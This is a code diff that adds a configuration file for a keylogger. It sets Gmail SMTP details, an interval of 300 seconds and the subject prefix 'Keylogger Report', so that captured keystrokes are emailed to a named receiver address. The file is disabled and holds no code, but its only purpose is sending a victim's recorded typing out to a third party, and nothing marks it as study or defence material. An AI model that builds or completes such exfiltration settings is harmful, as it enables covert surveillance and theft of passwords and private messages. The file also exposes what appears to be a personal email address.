@@ -1,0 +1,10 @@
+{
+    "enabled": false,
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "sender_email": "",
+    "sender_password": "",
+    "receiver_email": "rai230404@gmail.com",
+    "send_interval": 300,
+    "subject_prefix": "Keylogger Report"
+}
